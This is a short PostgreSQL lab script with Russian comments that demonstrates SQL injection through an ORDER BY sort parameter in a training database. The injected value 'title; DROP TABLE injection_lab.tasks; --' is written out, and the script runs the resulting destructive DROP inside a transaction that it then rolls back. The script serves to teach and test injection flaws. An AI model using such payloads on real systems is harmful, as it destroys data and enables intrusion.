-- Этап 2.3: атака на listTasks() через ORDER BY
-- sortField = "title; DROP TABLE injection_lab.tasks; --"
-- Внутри транзакции с ROLLBACK, чтобы не потерять стенд.

\echo === Состояние таблицы ДО атаки ===
SELECT COUNT(*) AS rows_before FROM injection_lab.tasks;

\echo === Запускаем атаку в транзакции ===
BEGIN;

-- эмуляция итогового запроса после конкатенации:
-- ORDER BY title; DROP TABLE injection_lab.tasks; --  ASC
-- PostgreSQL разруливает это как два statement'а: безобидный SELECT и разрушительный DROP
SELECT task_id, title, priority, created_at FROM injection_lab.tasks
ORDER BY title;
DROP TABLE injection_lab.tasks; --  ASC

\echo === Состояние таблицы внутри транзакции (после DROP) ===
SELECT COUNT(*) FROM injection_lab.tasks;  -- ошибка: relation does not exist

ROLLBACK;

\echo === После ROLLBACK таблица должна быть на месте ===
SELECT COUNT(*) AS rows_after FROM injection_lab.tasks;
